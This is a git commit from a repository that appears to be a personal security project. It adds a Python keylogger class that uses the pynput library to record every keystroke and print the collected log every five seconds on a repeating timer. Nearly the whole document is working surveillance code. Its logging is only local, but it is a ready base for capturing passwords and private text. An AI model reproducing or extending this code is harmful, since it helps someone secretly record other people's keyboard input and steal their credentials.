aeff5043a50f69f05a2c8b72e050439baca5b685
sapi3n-s3c <tyler.ceja5@gmail.com>
2021-09-21 15:21:42 -0400

    adds class to script

---
+++ Keylogger/keylogger.py
@@ -0,0 +1,33 @@
+#!/usr/bin/env python3
+import pynput.keyboard
+import threading
+
+
+class Keylogger:
+    def __init__(self):
+        self.log = ''
+    
+    def append_to_log(self, string):
+        self.log = self.log + string
+
+    def process_key_input(self, key):
+        try:
+            current_key = str(key.char)
+        except AttributeError:
+            if key == key.space:
+                current_key = ' '
+            else:
+                current_key = ' ' + str(key) + ' '
+        self.append_to_log(current_key)
+
+    def report(self):
+        print(self.log)
+        self. log = ''
+        timer = threading.Timer(5, self.report)
+        timer.start()
+
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_input)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
